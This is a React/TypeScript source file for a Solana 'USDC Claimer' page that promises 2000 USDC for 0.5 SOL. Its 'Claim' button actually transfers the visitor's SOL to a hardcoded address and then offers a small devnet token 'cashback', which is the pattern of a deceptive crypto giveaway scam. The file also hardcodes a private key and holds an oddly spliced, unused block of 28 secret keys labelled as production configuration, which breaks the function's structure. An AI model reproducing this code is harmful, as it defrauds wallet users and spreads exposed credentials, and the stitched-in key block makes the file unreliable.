/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "8Cvi1C7urExP8wNXhxUsBh9Zr4hzFFKAjc9qskT6Ycj8tZnV1gsqzM499ummcAauqoYhHoSufEsedbNuecCGDby"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5eWXwUtXSX6p3UdQLfpy9LU1k9PjDPYGVKPAzgN47611asoDVjwfJQQeoFaZLBysnmdgFCfnas1zcboSrYm6W5rN",
  "key1": "4dKsGaD2KnRbibptmXJtZZwsifBSvJq38WiLmGr7PVhQbtzt9B7RNmiP2dQF8RC7Y5pUiuMkVsFFyiS99zvQhtap",
  "key2": "2GAWkjthJWspHNcLZL1juQJ3zKC1QzaTXEn8RJ2LbKxtmmaYmD3EYDD3GaBK1pkden5eqCgf16yVyM6rosNVZz6u",
  "key3": "5w9xCYLXVfSJHbEo4yzXKR3zFmt63b2PM8B9eNNY5euTMAvGF3neMcnqMoBy9qGQUTt1kmc4gra4GS8bKL7UWYtY",
  "key4": "5Sgu5qS8Q9ypNwUnZiSzTN68NbYsk413DK6EQY6EeZzDsvmjPxShughU3Uv1FTiwrcGmsYwE6VDWwJ7U9WJHHrPt",
  "key5": "5XFL8SNs13s4AZ4SsTt36bQsiFgTnWYgQfvMCh16b1VzEkbouDLcCHpRtx5LG7Jp5dZufQR4BpGat2VzB87BCxi1",
  "key6": "5G2UdE7XHDyGyd75w3EtFXqGf4oLo5kr9p1T9E8DZmRBekrmxMNCfLncCUe4qUx7Gqw9ep5g54SZaDZvgnq3zeWk",
  "key7": "pXbp8RVn7bdyP6Gt13pYaW8zxTEzyhzzksyEsgNhZpiWjvBbWg6JDbnm5rcnMyN9mWhuneEECJj7rf2QfuJB3Rh",
  "key8": "uNLCVou6xnWTvdpZXUU1iiWbhPcegDZXXsZJQ6kRDRTCJmVtJTwS2YL1iztu6wsu23SBwdpZBmsWBakkSogjPwp",
  "key9": "5C4gZD8LAsj9XyozHLp9teqg71hydPnaCgxodFePcvFGLJj2CvBuoqtXf5zDeiUyvQnQG8ZH6MuYW7czzjCnGNa2",
  "key10": "2NT1tsWUBtUo5b6zUUmKwQqmLEE5yzTUHPxHxLVEYvnU1vnYRVwkfZXEiHo8CziEgY5mTkPGNgVsE8Sttrt5Fnry",
  "key11": "35y9MtUs6UEzbpsMg9gbCAg4RXYgx2irHoDovijEzYTdS6eHhuAubCPntbX8mwYQw8n9mUdQuGfZF84tn7vu6f8a",
  "key12": "56FY7GqEMz47Ve9Qyc3nX1sUYuhkarUyBoLarWmz5sDfLoCzGr1dXNEHrHouAqECKdAUC3FSVFiCuWQqQwRPkk61",
  "key13": "62riBXL2WYGPV73mSs4pK86v8cNyt3jjxfHFk1ZbtVgsx5EA7xFcwtCHhgoDZaUC3f4Cf8cFLzV49bi6mvUxoRGP",
  "key14": "4oEnpPHHaHMmJv74GuCyuV6uQfAaftWuLSewwEWWF7NWKSCd8hZkEwkaUpxt5DNnZErFeVKBmEGmYkuWyXaS6cWu",
  "key15": "5ZMYVzg4inoaQ5kHjMHQFYUQdEuZEnUAFHEntQ9yGyquCT3ueLZdedQ9drkf4fiLLxz79zHWanWwqNKVvU4YoQVK",
  "key16": "2E99RoSdW7VccztJVL7H5f3EapcZ2STR6vkBVksDMbTZaKPtegqXovfvTA7GAb7mgqAQdEZ15mHgEmgvF5LHWFr4",
  "key17": "54d2ZR4aE6GCb7HiMWJByE4gcjekLG9G75u3qE8hB2zcSp1EMsnxbozDHfxcSNgCFasiwoo2LnzwCcrN9LNWuWgg",
  "key18": "4at1uaT49cyzGTCpVvMbwsK6tQhc3xowFEP9TKVeBZyG9pe7uQKgLvpqu4v9pigSKkHnNEAtnKFNwNg9kmjsxtFU",
  "key19": "3m4RNSrEfLzU4UyN2pf387SFy396qdPZcMvNUBmo4xRgSFf4hXEYNmLdNKF7dT2C452kmnyqDTL4HSixdk7FVVMV",
  "key20": "5wvEEvtuiceXcFoVuJtB3ND9q3dSSAwe1N6taBmuBHMKNho9XZhEsDLB9w4zedVJJRjXcQdDxtwGAFW68VRb6fVA",
  "key21": "2rBQ3YduwAvbau1ThjCArdYGZ1b8FWhHwYKgjeNVBRjyT6YidQBLYUnRF5qtAcxz4pSPQGK6MFvK8ceQB4yGU3sp",
  "key22": "463nevYEAT2ohvFYNnXgk6R4ngQLytzAxzMdBM5vAsjJBhrZRpnC3TwUzqjpXekYPrFtoQBhvwMSDjzH9EucFK6Y",
  "key23": "4s5DibcStSCMYA8pFxR892vNmKfGiLAXck6MvaSzTN3ZoiCUU3qYFkx7jxeQnY8HJ3NHsAMwzVtvGSxuv9vwZVt",
  "key24": "5RW4Pky4uPnXeZ37azFFTDATaiFhUkYUFPWVCgGXNvQuYmbsQjdidKqqd95dR3qujqWZ3ZTjhd71Ab8NDgxWEW2i",
  "key25": "2SbL93drpSiAeRQfWzm3QDGrEHzeyVcu2qo4eDCJ4xVosUvFv7LwVnYAdjfJwTCXkAJzX7ub63GwgTcGzk7WHaLu",
  "key26": "3axTLEHNLm7PynAGo5vKoF7DN66kDpi8V6ygsP4ox4CWyGRFZPu3eeiJ9Fhxawxk1jLtqcoj7vET6vpnQMcY7PVX",
  "key27": "2Pj1bsXxAzuRh4GpV66EXjybPior2oe3E8FvZLtSGcAKh4ytPfJJMHxxhrqN6rLnG15qGQ8BN4GPabRpy5U2Mcdo"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
